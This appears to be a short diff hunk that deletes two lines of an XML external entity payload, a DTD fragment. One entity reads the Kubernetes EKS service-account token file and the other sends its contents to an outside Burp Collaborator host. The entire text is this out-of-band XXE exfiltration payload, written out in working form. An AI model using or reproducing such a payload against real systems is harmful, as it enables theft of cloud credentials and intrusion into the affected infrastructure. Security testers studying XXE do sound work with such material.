@@ -1,2 +1,0 @@
-<!ENTITY % data SYSTEM "file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token">
-<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM '0kl91hrfv9q0ie7ru8udi2fkdbj276vv.burp.stratumsecurity.io/?x=%data;'>">
